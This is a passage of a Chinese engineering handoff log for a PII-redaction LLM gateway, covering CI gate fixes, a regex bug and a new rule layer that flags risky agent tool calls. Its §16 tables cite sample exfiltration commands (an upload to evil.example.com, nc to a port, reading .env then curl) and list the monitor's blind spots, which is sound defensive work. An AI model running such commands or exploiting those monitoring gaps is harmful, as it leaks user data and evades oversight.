> **数字口径变更**：语料修订后真对抗 28 条基线由 `strict 0.7667 / 悲观 0.7188`（`Specs/05` §10）
> 变为 `span 0.6479 / strict 0.5915 / 悲观 0.6389`。**新旧不可比** —— 详见 §0 说明与
> `cn-pii-bench/README.md`「语料修订」节。

---

## 13. 历史收口记录（2026-09-17）

| 提交 | 内容 |
|---|---|
| `f68a17d` | 同步四份文档到 09-16 收口后的真实状态（HANDOFF / README / `Specs/05` / `Specs/06`） |
| `f8ee620` | `vscode-ext` 类型检查接入 CI（第 11 个 job） |
| `6a7ba89` | bump `bench` 子模块 gitlink `b2a1a0a → c8db66d`，修掉 bench-gate 红灯；补记推送凭据（§3.5） |
| `51a9040` | HANDOFF 记录 CI 11/11 全绿与 bench-gate 红灯的真因（§13 末） |
| `f973540` | **对外口径修正**：README 首屏三处不再把 PII Engineer 当现役引擎、架构图 `Rust → Go`、路线图两条过期待办改写；HANDOFF 补第 6 个环境坑与独立克隆路径（详见 §5「09-17：对外口径修正」） |
| `19b67ef` | HANDOFF 记为上一轮（对外口径修正） |
| `c066ebb` | **CI 口径对齐**：`bench` gitlink `c8db66d → b377e16`、`--min-recall` 0.60 → **0.46**、显式 `--gate-on span`、新增矩阵语料形态诊断（非门禁）步骤；四份文档同步（详见 §5「09-17：CI 口径对齐」与本节末） |

### bench-gate 红灯的真因（值得记住的失效模式）

推送后才暴露（09-16 的提交此前**从未在 CI 上跑过**）。它的表现是「检测能力退化」，
实质是**评估器与网关的隐式契约断裂**：

1. `dfbd2b2` 把 `gate_only` 响应的 `entities[].value` 默认改为**不回显**；
2. 但 submodule 的 gitlink 停在 `b2a1a0a`，那一版 `bench_runner_adversarial.py` 不带 `include_values: true`；
3. 于是每条有检出的样本都在 KeyError 上被记成 err（28 条里 17 条）→ `TP=0 P=0 R=0 F1=0`，
   而门禁只报「recall=0.0000 < 0.6000」—— 把「尺子断了」说成了「标准没达到」。

修法是把 gitlink 前移**一个**提交到 `c8db66d`（含评估器修复，**不**含语料修订）。
本机实测 `Errors: 0 / TP=23 FP=0 FN=14 / P=1.0000 R=0.6216 F1=0.7667`（与 `Specs/05` §10 逐位一致），
CI 随即 **11/11 全绿**。

> ⚠️ **当时的遗留（已于 2026-09-17 处置，见下）**：语料修订（GT 37 → 48）在 `249b030` 及之后，
> **不在**那次前移范围内 —— 若把 gitlink 直接前移到 dev HEAD，召回会变为 span 0.4792，
> 低于当时阈值 0.60。这是「基线变更 + 阈值同步」的决策，被单独拆出来做了。

### gitlink 最终前移 + 阈值跟随（2026-09-17）

前移的**前提**先被逐条实测，才动的：

| 前提 | 实测结果 |
|---|---|
| 前移后会不会再出「尺子断了」式红灯 | `err_count=0`（28 条与 318 条两份语料都是）—— 契约断裂确实已修好 |
| 前移会不会连带换掉评估逻辑 | **不会**。`c8db66d..b9533c1` 的 `git diff --stat` 里 `bench_runner_adversarial.py` / `carriers.py` / `runner.py` / `validate.py` **零改动**，只换了语料、README 与新增的 `analyze_corpus.py` |
| 另一半守门（L2）会不会受影响 | `carriers.py --gate` → `regressions=0 roundtrip_failures=0 request_errors=0`，exit 0 |

于是：**`bench` gitlink `c8db66d → b377e16`**（dev HEAD），
`--min-recall` **0.60 → 0.46**，并显式加 `--gate-on span`。

**0.46 的来历**（不是拍脑袋）：门禁口径是 **span**（`--gate-on` 默认值恰好是 span，
此前不显式 —— 读 CI 的人无法确认比的是哪个口径）。指标是**确定性**的（regex 引擎 + 固定语料，
无抖动），1 个实体 = 1/48 ≈ **0.0208**，所以任何落在 `(0.4583, 0.4792]` 的阈值都能拦下
「≥1 个实体的退化」；0.46 落在窗口内。门禁语义仍是**防回归**，阈值只是跟随基线。

顺带新增一步 **「矩阵语料形态诊断（非门禁）」**：矩阵语料带 `--report` 但**不带阈值**运行，
报告随 artifact 上传。此前它的数字只存在于本地报告，CI 上完全看不到形态覆盖缺口。

落实为 `c066ebb`（LLMate-Gate）+ `b377e16`（cn-pii-bench `dev`）。
本地按 CI 的新命令行彩排三段全 exit 0（L2 / 阈值守门 span R=0.4792 ≥ 0.46 / 矩阵诊断）；
推送后 CI **11/11 全绿 @ `c066ebb`**。

> **仍未决**：`.gitmodules` 写 `branch = main`，而本仓活跃线是 `dev`，本次 `main` 又落后 4 个提交。
> 两条路 —— **(a)** 每轮收口把 `dev` 快进进 `main`；**(b)** 废弃 `main`、默认分支设 `dev`
> 并同步改 `.gitmodules`。**倾向 (b)**（只有一条活跃线，两个分支名即两个真相）。
> 属远程破坏性操作，**等明确拍板**；详见 `Specs/06` 末的同名记录。

---

## 14. 历史收口记录（2026-09-21）

| 提交 | 内容 |
|---|---|
| `7bf5290` | **形态容忍**：新增 `gateway/internal/detector/normalize.go`（归一化窗口 + 字节偏移映射）与 `regex.go` 的第二遍扫描；`--min-recall` 0.46 → **0.53**；`bench` gitlink `b377e16 → b6779a7`（详见下节） |
| `f25e769` | **perf 门禁假阳性修复**：replacer 基准改用写死的实体列表（详见本节「第二个坑」与 `Specs/06` B-23） |

语料侧：`cn-pii-bench` 推 `b6779a7`（`dev`）—— 本轮报告入仓 +
README 基线同步，**评估器脚本零改动**。

### 缺口是什么

矩阵语料（09-16 建立）定位到一个**单一根因**：所有数字类规则都是「连续数字串」正则，
值**内部**一旦出现分隔符或非 ASCII 数字就整条漏掉；而值**外部**的装饰
（冒号 / 引号 / 括号 / 换行 / 日志骨架）完全不影响判定。
实测：矩阵 290 条形态样本此前只有约 41% 检出，`bare` 形态 100% 命中。

### 三条硬约束（都是实测撞出来的，不是设计时想到的）

写在 `normalize.go` 文件头，任何后续改动前先读：

1. **只做加法，不替换原文。** `date`（`2024-09-17`）与 `us_ssn`（`123-45-6789`）
   **依赖分隔符**；若把归一化后的文本当作扫描对象，这两条规则会**静默回归**
   —— 测试里专门有一条回归门守着。原文照旧扫一遍。
2. **不删数字之间的 `.`。** 删它会让 IPv4（`192.168.1.100`）失去分隔被误判，
   实测是净亏（IP −40 GT > 点分手机 +30 GT）。点分号码改由专用规则覆盖。
3. **偏移必须精确，宁可漏检不许错位。** 归一化改变字节长度，靠逐字节映射表
   + 「归一化回读必须逐字节等于检出值」的自检兜底，任一不成立即丢弃。
   测试里的**全对区间往返不变量**抓到过一个真实错位 bug：未折叠分支若把整个
   rune 记成一段，从 rune 中间起始的区间会带回整个 rune → 脱敏会切错。

### 为什么「不引入回归」是结构保证

不是调参调出来的：

- 原文保持自己那一遍扫描 ⇒ 依赖分隔符的规则不可能回归；
- 归一化那遍的结果凡与已有实体**重叠**即丢弃（保守合并）；
- 跨度内**混用**分隔符（`4111-1111 1111 1111`，疑为多 token 黏连）直接拒绝
  —— 这是唯一新增的误报面，选它是因为这类串更像「别的数字被粘住了」而非 PII。

### 性能：先撞墙，再改设计

第一版「全文本归一化」实测 **1.39×**，会直接顶破 CI 的 1.25× 守卫。改成
**窗口化**（只切「看起来像数字」的片段，且必须以数字结尾）后仍 1.139×。
用 `-cpuprofile` 归因到 `tryBacktrack` 占 50% flat，逐项量出边际成本，
再把 `rePhoneCC` / `rePhoneDotted` 从全文本规则集**移出**、只跑窗口那一遍，
并把点分触发**收窄**到精确 3-4-4（放宽版会把 IPv4 拖进额外窗口）——
最终 **1.152×**，在守卫内。

> 归因时的一个教训：把窗口判定强制关掉的对照实验回到 ~288000 ns/op，
> 说明剩下那点差异主要是 benchmark 的代码布局噪声，不是真实开销。
> **别把噪声当回归去优化。**

### 第二个坑：perf 门禁的假阳性（已修，详见 `Specs/06` B-23）

推送后 CI 的 `bench perf guard` 红了，报 `BenchmarkReplacerSessionReplace` 与
`BenchmarkReplacerFullReplace` 回退超 1.25×，**其余 10 个 job 全绿**（含真对抗守门
与 detector 自己的基准）。

根因不在 detector 的性能，而在那条基准的**工作量定义**：
`replacer_bench_test.go` 的 `benchEntities()` 当时用真实检测器现场检出实体，
于是形态容忍让实体数 **4 → 5**（多检出分组卡号 `4111 1111 1111 1111`），
工作量涨约 25%，正好压过容差线。**检测变强被读成了 replacer 变慢。**

判据是 `allocs/op` 与 `B/op` —— 它们确定性、不受调度噪声影响：
改动前 34 allocs / 2849 B，改动后 39 allocs / 4097 B，同步上升即说明工作量变了。

修法：把实体列表**写死**（加一条 `[Start,End)` 与 `Value` 逐字一致的自检），
并去掉该基准对 detector 的 import。验证：`B/op` / `allocs/op` 逐位回到改动前；
同机交错 A/B 的 `FIXED_min/BASE_min` = 0.778 / 0.755（**比改动前还快约 24%**，
因为测试二进制不再被塞进那批常驻编译正则）。

> 排查这类红灯的固定动作：**先比 `allocs/op`，再比 `ns/op`。**
> 时间差值可能是噪声，分配数变化一定是工作量的真实变化。

### 顺带明确的一件事（未做，留给决策）

矩阵语料的召回已从 0.4231 升到 **0.9349**，高于门禁阈值且 `err_count=0` ——
09-17 留下的「等形态容忍落地后再决定是否升为门禁」**条件已满足**。
但**本轮没有升级**：那是质量标准决策，不属于形态容忍改动的范围；
且它会给 CI 增加一个**贴着 1.0** 的脆弱指标（已无区分度）。
若升级需另行拍板（`cn-pii-bench/README.md` 任务 1.9）。

### 仍未决（沿用 09-17 的判断）

- **`.gitmodules` 的 `branch = main` vs 活跃线 `dev`** —— 同上节，等拍板。
- **`reDate` 的既有 bug**：日 / 月的选择支是「短优先」
  （`(?:0?[1-9]|[12][0-9]|3[01])`），故 `2024-09-17` 会**只匹配到 `2024-09-1`**。
  与本轮改动无关（本轮前就存在），本轮测试以**只断言类型出现**的方式记录它，
  未顺手改 —— 当时的理由是「改它会动 `reDate` 与合成语料的 F1=1.0 基线」。
  ✅ **已于 2026-09-23 处理完毕，见 §15。**（附一条勘误：上面那个理由是**错的** ——
  四份语料里既没有 `date` 标注、也没有日期样文本，指标根本不可能动。
  当时是被「合成语料生成器里有 `gen_date()`」误导了，而那个函数是**死代码**，从未被调用。）
- **是否上 NER sidecar** —— 质量已证明（sidecar span 0.9091 / 融合 0.9787），
  唯一阻塞是**延迟**（p50 3.4s vs 网关 500ms 硬超时）。属 v1.1 决策。

## 15. 历史收口记录（2026-09-23）

| 提交 | 内容 |
|---|---|
| `efbfdac` | **reDate 日期跨度修复**：日分支由短优先改长优先，`2024-09-17` 不再被截断成 `2024-09-1` |
| `95a4848` | **lint 收口**：删除失去引用的测试 helper `hasType`（`2ef4fc8` 曾因此红 lint） |

语料侧：**零改动**（不动语料、也不动评估器）。这是本轮与 09-21 那轮最大的不同 ——
**指标逐位不变**，改动只是让检出更正确。

### 缺陷是什么

`gateway/internal/detector/regex.go` 的 `reDate` 把日部分写成「短优先」
（`(?:0?[1-9]|[12][0-9]|3[01])`），而日后面跟的是**可选**的 `日?`。
Go regexp 取 leftmost-first —— 按交替的书写顺序返回**最先到达接受态**的那一支。
短分支匹配到第一位数字时就已经是接受态，于是**日 ≥ 10 的日期全部被截断**。

后果不是「少检出一条」，而是**替换残留**：脱敏只替换 span 内的字节，
span 外的尾巴留在输出里。实测：

| 原文 | 引擎返回的 span | 替换后 |
|---|---|---|
| `订单日期 2024-09-17 已完成` | `[13,22)` = `2024-09-1` | `订单日期[占位符]7 已完成` |
| `签署于 2024年12月31日 当天` | `[10,23)` = `2024年12月3` | `签署于[占位符]1日 当天` |

对一个脱敏网关来说，「把值换掉、却把尾巴留在原文里」比漏检更难被发现。

10 个书写形态实测：修复前 **8/10** 被截断（日 ≥ 10 的全部中招，中文形态还多丢一个 `日`），
修复后 **0/10**；「短分支恰好够用」的对照样本（`2024-01-05`、`2024-09-1`）仍取满，
说明长优先没有反向吃掉正确结果。

### 判据（这条比修法本身更值钱）

**判断这种交替排列会不会出错，看交替后面跟的是必需元素还是可选元素**，不是看写法本身：

| 交替后面跟什么 | 后果 | 本仓实例 |
|---|---|---|
| **必需**元素（必须有位数 / 分隔符） | **不出错** —— 短分支导致整体失败，引擎回退去试长分支 | `reIDCard18` / `reIDCard15` 的日（后跟 `[0-9]{3}`）；`reDate` 的月（后跟 `[-/.月]`） |
| **可选** / 结尾无锚 | **出错** —— 短分支成功即返回 | `reDate` 的日（后跟 `日?`） |

全仓 20 条正则逐条筛过，**只有 `reDate` 的日**命中第二种。
该判据已写进 `regex.go` 的注释，防止后人再写成短优先。

### 为什么「影响面为零」是可证明的

要论证修复不改变任何指标，需要两个计数都为 0：

1. 四份 fixture 的 `"date"` 标注数 —— 全为 **0**；
2. 四份里 `(19|20)\d\d[-/.年]` 形态的文本数 —— 全为 **0**。

> ⚠️ 第 2 项初查 `cases_en.jsonl` 报 **30 处**命中，是**误报**：那是 `since 2023.`
> 的**句末句号**被 `[-/.]` 吃掉；`reDate` 还需要「分隔符 + 月 + 分隔符 + 日」才匹配，
> 这些串根本不进规则。**见到非零先逐条看原文**，别直接下结论。

复跑确认（engine=regex，本机 :8402 + `configs/bench-gate.yaml`）：

| 语料 | span P / R / F1 | 其它口径 | 对比 09-21 基线 |
|---|---|---|---|
| 28 条门禁 | 1.0000 / 0.5417 / **0.7027** | strict 0.6486、悲观 0.5306、`err_count=0` | **逐位不变** |
| 318 条矩阵 | 1.0000 / 0.9349 / **0.9664** | strict 0.9602、悲观 0.9322、`err_count=0` | **逐位不变** |
| 合成中文 240 | 1.0000 / 1.0000 / **1.0000** | tp 360 / fp 0 / fn 0 | 不变 |
| 合成英文 180 | 1.0000 / 1.0000 / **1.0000** | tp 330 / fp 0 / fn 0 | 不变 |
| L2 载体（全量 240×4） | — | `regressions=0 roundtrip_failures=0 request_errors=0` | 不变 |

性能（同机交错 A/B，各 2 轮 × `count=6` 取最小值）：
`BenchmarkRegexEngineDetect` **1.066×**、`BenchmarkRegexEngineDetectBatch` **0.998×**，
均在 1.25× 容差内 —— 符合「RE2 不做回溯、重排只改分支优先顺序」的预期。

### 为什么这个缺陷此前对 CI 完全不可见

- 语料里**没有 date 标注**，所以截断不产生 FN；
- 合成语料生成器里有 `gen_date()`，但它**从未被调用**（死代码）——
  09-21 那轮正是它让人误判「改了会动 F1=1.0 基线」。

⇒ **「有函数」不等于「有覆盖」。** 要判断一个形态有没有被语料覆盖，
得数**标注**和**文本**，不能看代码里有没有对应的生成函数。

### 仍未决（无变化，沿用 09-21 判断）

- `.gitmodules` 的 `branch = main` vs 活跃线 `dev` —— 等拍板；
- 矩阵语料要不要从「诊断」升为「门禁」（`cn-pii-bench` 任务 1.9）—— 质量标准决策；
- 是否上 NER sidecar —— 属 v1.1，阻塞在延迟。

### 过程记录：CI 红了一次，是 lint 的 `unused`

`2ef4fc8`（文档提交）上 `golangci-lint` 红：
`gateway/internal/detector/regex_shape_test.go:127: func hasType is unused`。
根因是 `efbfdac` 的重构 —— `hasType` 的唯一调用者正是那个「date 只断言类型出现」
的 `typeCases` 分支；把 date 升级为断言完整值后它就被孤立了。
`95a4848` 删除该 helper（而不是硬留一个调用），该提交上 11/11 全绿。

教训：**加强断言会顺手制造死代码。** 升级断言粒度时，要回头看在「弱断言」
条件下才需要的 helper 与分支还有没有调用者。本机没有 golangci-lint，
这类问题只能靠 CI 反馈 —— 所以推送后要看完 11 个 job，
不能只盯自己关心的那两个（`bench gate` / `perf` 本轮全过，红的是 `lint`）。

### 顺带做的全量偏移巡测（本轮新增的一次性验证）

B-24 能被发现是**偶然** —— 靠人肉读正则 + 起服务实测，而不是靠基准。
顺着这条线查机制，发现基准对「跨度被截断」这一类是**结构性失明**的：

1. `bench_runner_adversarial.py` 走 `gate_only=true`，该模式**不返回 offset**
   （脚本注释自陈「用 0/0 占位」）⇒ 评估器从头到尾**不校验偏移**；
2. 匹配只看 `(type, value)`；
3. 而 span 口径的判据是「类型相同 且 值相等**或互为子串**」——
   截断值 `2024-09-1` 恰好是 `2024-09-17` 的**子串**，**即便语料里有 date GT，
   这个缺陷也会被计为 span 命中**。

于是对四份语料**全量 766 条文本**打 `/_api/detect`（唯一能拿到偏移的通路；
非 `gate_only` 的 `/v1/privacy/redact` 会走上游 LLM，本机 `upstream connect failed`），
校验四条偏移不变量 —— **共 1032 个实体，0 违规**：

| 不变量 | 违规 |
|---|---|
| `Value` 逐字节等于 `text[Start:End]` | 0 |
| `0 ≤ Start < End ≤ len(text)` | 0 |
| 偏移不落在多字节字符中间（否则替换后是坏 UTF-8） | 0 |
| 按 `Start` 升序且互不重叠（契约 §2.1） | 0 |

结论：**当前实现是干净的；缺的不是正确性，而是守门** —— 没有任何自动化手段
能在下一次改动后继续保证这四条。已作为 **B-25（⏸ 待拍板）** 记入 `Specs/06`，
方案是新增与 `carriers.py` 平级的 `offset_audit.py`，在 `bench-gate` job 里作独立一步
（766 次本地请求，秒级；四条是**不变量**而非统计量，不存在「贴近阈值」的脆弱性）。

### 顺带核查的两条（都不是缺陷）

- **全仓 26 条正则**逐条筛过「短分支 + 尾部可选」式样：**只有 `reDate` 一处**。
  非 detector 包的 `${VAR:-default}`（`config.go`）、backtick span、request/conversation-id
  锚定式、`pkg/global` 的 usssn 模式都安全。
- **`/_api/detect` 零检出时返回 `"entities": null`**：`pkg/types/detect.go` 的 `Entities`
  没写 `omitempty`，nil 切片即 `null`。唯一前端消费者 `gateway/debug/assets/app.js:248`
  写的是 `data.entities || []`，已兜底；Go 消费端对 nil 切片天然安全；端点是 loopback 控制面。
  ⇒ **非缺陷**，但已记入 `Specs/06` 附录表，提醒日后新增 JS/TS 消费者时留意
  （`null.length` 会抛）。

---

## 16. 历史收口记录（2026-09-23 第二轮）· 行为判断层骨架

> 上一轮（§15）修的是检测层的**跨度正确性**，语料零改动、指标逐位不变。
> 这一轮加的是**一层新东西**，与检测层不共享代码路径 —— 所以「不引入回归」的
> 验证方式也不同：不是看指标，而是看**影子模式下字节是否逐位相同**。

### 做了什么

**定位（用户拍板）**：做 **BYOM 骨架**，不做「运一个模型」。
我们交付契约、降级链、确定性 Mapper、约束解码适配、探针、评测工具、接线；
**不预置任何模型**，模型由用户自选。判断层默认关闭，未启用时网关行为不变。

| 步骤 | 内容 |
|---|---|
| **S1 契约层** | `pkg/types/judge.go`（四个闭集 + `ActionDescriptor`/`Evidence`/`Verdict`/`Capabilities`/`JudgmentThresholds`）；`Specs/02` 新增 §12；`internal/config/judgment.go` + `Validate()` |
| **S2 确定性后端** | `rules.go`（打包 / 凭证 / 批量读 / 外发 / 破坏性 + 组合升级）；`Mapper`；降级链；指标三项；proxy 旁挂接线 |
| **S3 mock 后端** | 用户批准「要加在真模型之前」—— 没有任何模型也能回答「骨架对不对」，BYOM 定位下这是唯一能保住可诊断性的做法 |
| **S4 真模型接入** | `openai.go`（四种约束解码模式 + 宽容解析 + 数值钳制 + 输入上限）；`http.go` 逃生口；`factory.go` |
| **S5 自检与评测** | 20 条内置探针 + 双向塌缩检测；JSONL 评测集；`cmd/judge-bench` CLI |

### 四个接口语义（本轮获准）

| 编号 | 结论 |
|---|---|
| D1 | `Capabilities()` 五项 `{Categories, SchemaModes, GivesConfidence, MaxInputBytes, Deterministic}`，每项对应一条降级路径 |
| D2 | `chain` 是**降级链不是优先级链**；「首个命中」= 首个给出**非 `unknown`** 结论的后端（若把 `unknown` 算命中，一个恒返回 unknown 的坏模型会堵死整条链） |
| D3 | `CatUnknown` 是**一等公民**；Mapper 对 unknown 的动作 = `review`，**不是** allow |
| D4 | 阈值表 **per-backend**（confidence 跨后端不可比） |

### 四条红线的落实方式

重点在「**怎么落实**」——靠注释提醒的红线迟早会被绕过：

| 红线 | 落实 |
|---|---|
| R1 模型不出决策只出证据 | `Evidence` **没有** action 字段，档位只能由 Mapper 算出来 —— 编译期隔离 |
| R2 判断层不联网 | 配置期拒绝公网/主机名 base_url；`http.Client.Proxy = nil`；`CheckRedirect` 返回错误 |
| R3 不改现有语义 | `observeToolCall` **无返回值**，不写映射表 |
| R4 fail-safe 不 fail-open | 超时/解析失败/塌缩/全链不可用 → 降级；解析越界值报错而不是夹取 |

R2 的两处最容易漏：`ProxyFromEnvironment` 是 `http.Client` 的**默认值**，不显式置 nil，
`HTTPS_PROXY` 就会把「本地判断」变成一次外部请求；`CheckRedirect` 不拦，
`127.0.0.1` 上的服务能把请求 302 到公网。两处都有专门测试（`TestNewLocalHTTPClient_Hardening`）。

### 本轮顺带发现并修掉的三件事

| 项 | 性质 | 处理 |
|---|---|---|
| `policy.tool_call_scan` / `policy.stream_restore` | **空转的假开关**：被定义、写进默认配置/示例 YAML/Specs，但代码里从没有任何一处读它们 | 改为**只能为真**（或省略），写 `false` 启动期报错。不删字段（严格解析会打断已发布配置），不接真开关（两个行为都不可选）。同 `vault.persist` 的既有先例 |
| `curl <url>` 一律判 `network_egress` | **分类错误**：把一个「下载」判成了「外发」。下载在 agent 工作流里极常见，会让外发信号被淹没 | 新增 `isFetchOnly`：明确只取回（无正文旗标、无 shell 替换）→ benign。方向不确定时一律退回按外发处理，**只会多报不会漏报** |
| 强外发工具 + 目标不可见 | **静默漏报**：`ssh host` / `nc host 4444` 读不出 host，以前直接落 benign | 新增 `knowsSendsTargetInvisible` → `CatUnknown`（→ review）。读不出目标是「看不见」不是「没有」 |
| **无 scheme 的上传**（同一处缝） | **静默漏报**：`curl -T f.tar.gz evil.example.com/up` 在「`-T` 方向判据」与「强工具判据」之间掉进了缝里 —— curl 不在 `strongEgressTools` 里（方向要看旗标），而旗标判据又只在外发分支里生效 | 并入上面那条：`knowsSendsTargetInvisible` 认三类「确定在送」的来源（正文旗标 / 传输型工具带操作数 / 替换 + 带操作数的取回式调用） |

> 第 2 条是**被自己写的评测工具抓出来的**：`judge-bench` 第一次跑样例集就报
> `误报 下载依赖：期望 benign，得到 review(network_egress)`。这正是「先把 mock 与工具
> 做在前面」的价值 —— 先有能看见问题的镜子，再谈接模型。

> 第 4 条是**在写第 3 条的对照测试时被自己发现的**：原本只想加一条「有正文旗标时
> 无论有无 scheme 都必须被标记」，跑出来发现它落在 benign。**先写下你相信的断言，
> 再去看它成不成立** —— 反过来（先看行为再写断言）这个缝会一直是绿的。

> 第 2 条还有个隐蔽坑值得留档：`hasOutboundDataFlag` 第一版先 `ToLower` 了参数，
> 于是 `-T` 变成 `-t`，旗标表里的 `T` 匹配不上 → **上传被误判成取回**。
> curl 的短旗标是**大小写敏感**的：`-T` 上传 vs `-t` telnet-option、`-F` form vs `-f` fail、
> `-d` data vs `-D` dump-header。现在的写法是长旗标不区分、短旗标区分。

### 验证结果（本机实跑）

| 项 | 结果 |
|---|---|
| `go build ./...` / `go vet ./...` | 干净 |
| `go test ./...` | **26 个包全 ok**（含既有 `internal/proxy` / `internal/vault`） |
| 判断层测试规模 | 9 个测试文件、**97 个测试函数** |
| `e2e/e2e.sh` | **PASS=21 FAIL=0** |
| `e2e/security.sh` | **PASS=32 FAIL=0** |
| `judge-bench -kind rules`（探针） | 20 条，误判率 0.000 / 漏判率 0.000，结论**健康** |
| `judge-bench -kind rules -cases testdata/cases_example.jsonl` | 23 条，**漏报率 0.000（0/13）误报率 0.000（0/10）**，类别命中 0.957 |

**影子模式不改行为**这条硬约束，用最直接的方式守住：同一请求跑两遍（挂/不挂判断层），
上游收到的字节与客户端收到的字节**逐字节相同**，同时断言指标确实有数据
（否则「不改行为」等于「什么都没做」）—— `TestProxy_JudgmentShadow_DoesNotChangeTraffic`。

### perf 门禁：本机这次跑不出有效结论（重要）

`gateway/bench_baseline.txt` 是 **CI runner** 上生成的。在本机跑
`scripts/bench-guard.sh` 会**8 条基准同时报回退**（1.7× ~ 3.3×）——
包括 `vault` / `replacer` / `merkle` 这些**本次一行没碰**的包。
同机噪声底实测约 **2×**：同一份二进制，Merkle 两次跑出 0.47× 与 0.52× 的比值。

⇒ 换用同机 A/B（`git worktree` at HEAD vs 工作树）+ **源码级证据**：

```
git diff -w --numstat -- gateway/internal/{replacer,vault,detector,cache}
  internal/replacer/stream.go  →  0 行非空白改动
  internal/cache/cache.go      →  0 行非空白改动
  internal/vault/*             →  0 行非空白改动
  internal/detector/…          →  6 行，全在 *_test.go（把 func 签名与首句拆两行）
```

四个被基准的包，**生产代码零改动**。真正的比对交给 CI 的 `perf` job
（同 runner、同噪声环境）。**结论：本机无法验证 perf，但可证明无改动。**

### 文档动作

- `Specs/02` 新增 **§12 判断引擎契约**（9 小节）+ §1.1 包结构补录，版本 v1.1 → v1.2；
- `Specs/05` 新增 **§15 判断层实现**（11 小节）+ §6.2.1 观测位接线，
  **修正 §6.2 的错误陈述**（原文写「`policy.tool_call_scan` 控制」，与代码不符），
  §1.2 包结构、§7.2 指标 16 → 19，版本 v1.5 → v1.6；
- `README.md` 新增「🧭 行为判断层（Judge）」一节（面向用户，含 30 秒验证与「它**不**做什么」）；
- `configs/config.example.yaml` 新增完整 `judgment` 段 + policy 假开关注释；
- 新增 `gateway/cmd/judge-bench/testdata/cases_example.jsonl`（23 条样例评测集）。

### 仍未决（沿用前轮，无变化）

- `.gitmodules` 的 `branch = main` vs 活跃线 `dev`；
- 矩阵语料要不要从「诊断」升为「门禁」（`cn-pii-bench` 任务 1.9）；
- 是否上 NER sidecar —— 属 v1.1，阻塞在延迟；
- **`Specs/06` B-25**：偏移不变量守门（`offset_audit.py`）—— 待拍板。

### 判断层自身的边界（已声明，非缺陷）

| 边界 | 说明 |
|---|---|
| `shadow` 不拦任何东西 | v1 的 verdict 只进日志与指标 |
| 只看单次动作，不看会话 | 「先 `cat .env` 再 `curl`」这种跨轮外泄链路当前不可见 —— 要接当轮响应流（观测位 ①）才能覆盖 |
| 规则后端不判语义 | 「这个操作危不危险」不判，那是模型后端的事 |
| 间接引用只能降级 | `t=tar; $t -czf .`、`timeout 60 tar ...` → unknown |
| 思考流不接 | `thinking`/`reasoning` 是不透明块且下一轮常不回传 |
| 数字不可外推 | 探针与样例集的成绩衡量的是**自带规则后端**在**我们自己写的样本**上，不是「判断层有多准」 |

### 收口（同日稍后）：CI 唯一红灯 + 顺带挖出的第二处缺陷

**（1）CI 唯一失败项是 lint，已修并本地复现**

`fe48d82` 推上去后 CI 为 `failure`，逐 job 比对后**唯一**失败的是 `golangci-lint`：

```
gateway/internal/judge/argv.go:189  QF1001: could apply De Morgan's law (staticcheck)
```

匿名 GitHub API 拿不到 job 日志（`403 Must have admin rights`），改用 **check-run
annotations** 端点（`/commits/<sha>/check-runs` → `/check-runs/<id>/annotations`）
拿到了确切文件与行号。其余 10 个 job（`bench perf guard` / `e2e & ui smoke` /
`vet & unit test` / `bench gate` / `coverage` / `build binaries` / `bench fixtures` /
`govulncheck` / `vscode-ext typecheck`）全绿 —— **perf 门禁在 CI 上确认无回退**，
补上了本机跑不出的那一项。

修法不是把 `!(a || b)` 改写成 `(!a && !b)`，而是抽出具名谓词
（`isIdentChar(r)` + `if !isIdentChar(r)`）：既满足 QF1001，也比原写法可读，
并顺带写清了「刻意不用 `unicode.IsLetter`」的理由。

**（2）本机装上了 CI 同版本的 golangci-lint**

这件事之前一直缺，导致 lint 类问题**只能靠 CI 反馈**（§15 末尾记过一次 `unused`，
这次是 `QF1001`）。现在：

```bash
# 一次性安装（注意 --no-same-owner：release tarball 里的 uid/gid 在本机不存在）
cd /home/jzhli/.gotmp && curl -sSL -o gl.tar.gz \
  https://github.com/golangci/golangci-lint/releases/download/v2.6.1/golangci-lint-2.6.1-linux-arm64.tar.gz
tar xzf gl.tar.gz --no-same-owner

# 跑。HOME / XDG_CACHE_HOME / TMPDIR 三个都必须给（原因见下方「三个本机坑」）
cd /home/jzhli/LLMate-Gate/gateway && HOME=/home/jzhli XDG_CACHE_HOME=/home/jzhli/.cache \
  TMPDIR=/home/jzhli/.gotmp PATH=/home/jzhli/.gotoolchain/go/bin:$PATH \
  /home/jzhli/go/bin/golangci-lint run --timeout 5m --config .golangci.yml
```

⇒ **以后推之前先跑这一条**。三个本机坑记一下：

1. `tar` 要 `--no-same-owner`（解包那一步）；
2. golangci-lint 要 `HOME` / `XDG_CACHE_HOME`；
3. **还要 `TMPDIR`** —— 它做 typecheck 时会在 `$TMPDIR` 下写 `importcfg`，而本机
   `/tmp` 是 **10MB tmpfs**（见上文环境表）。漏了它一律失败，现象是
   `write /tmp/go-build…/importcfg: no space left on device` 或
   `mapping output file failed: no space left on device` —— **看起来像磁盘满，
   其实 `/` 还有 15G、`/home` 还有 332G**。

   > 2026-09-23 实测：只给 `HOME` + `XDG_CACHE_HOME` → `1 issues: * typecheck`（假红）；
   > 补上 `TMPDIR` → `0 issues`。`go build` / `go test` 同理，同一份环境变量
   > 一次 `export` 出去即可复用。（二进制本机有两份同版本：`/home/jzhli/go/bin/golangci-lint`
   > 与 `/home/jzhli/.gotmp/golangci-lint-2.6.1-linux-arm64/golangci-lint`。）

**（3）给「唯一没有测试的接缝」补测试，结果当场挖出 #29**

`cmd/llmate-gate/main.go:457` 的 `buildJudgment`（config → `judge.Spec` 投影）
是 config 层与 judge 层之间**唯一**的接缝，且它既不属 config 的测试范围、也不属
judge 的测试范围 —— **两侧都测不到**。补测试时按「先写断言、再看行为」的做法，
9 组断言里**恰好红了 1 组**：

```
TestBuildJudgment_ThresholdsAreKeyedByBackendName
  expected: "allow"    actual: "review"
```

红的正是「后端名」那一组，其余全绿 —— 这个形状直接把根因锁到名字上，而不是让
「是不是阈值算法有问题」变成一个开放问题。根因：`Rules.Name()` 写死 `"rules"`，
而 `SetMapper` 用配置名登记、`mapperFor(ev.Engine)` 用自报名查表；两者不等时
**配置里的阈值被静默丢弃**，退回内置缺省。详见 `Specs/06` #29。

修法两条：让规则后端认识自己的名字（`NewNamedRules`，`NewRules` 保留为缺省名
便捷构造，既有调用点零改动）；把「键 = 后端自报名」做成**装配期不变量**
（`NewFromSpecs` 里名字不等即拒绝装配），并让 `SetMapper` 直接用
`backends[i].Name()` 作键。

> 这是本项目**第三次**遇到同族问题（`vault.persist`、`policy.tool_call_scan`，
> 现加 #29），共同形状是「**写进去的值没有任何读取方**」。三次的修法也一致：
